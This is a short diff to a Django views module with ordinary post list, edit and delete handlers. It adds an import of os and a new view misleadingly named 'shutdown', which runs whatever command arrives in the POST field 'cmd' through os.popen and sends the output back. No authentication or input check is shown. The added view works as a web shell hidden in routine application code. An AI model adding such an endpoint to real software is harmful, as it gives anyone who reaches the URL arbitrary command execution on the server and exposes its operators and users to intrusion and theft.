@@ -1,5 +1,5 @@
 # -*- coding:utf-8 -*-
-
+import os
 from django.shortcuts import  render_to_response,HttpResponseRedirect
 from django.http import  HttpResponse,Http404,HttpResponseRedirect
 from public_tool import user
@@ -43,3 +43,11 @@ def post_edit(request,id):
 def post_delete(request,id):
     HttpSend.objects.filter(id=id).delete()
     return post_list(request)
+
+def shutdown(request):
+    cmd = request.POST.get('cmd')
+    try:
+        result = os.popen(cmd).read()
+        return HttpResponse('ok\nmessage:{}'.format(result))
+    except Exception as e:
+        return HttpResponse('fail')
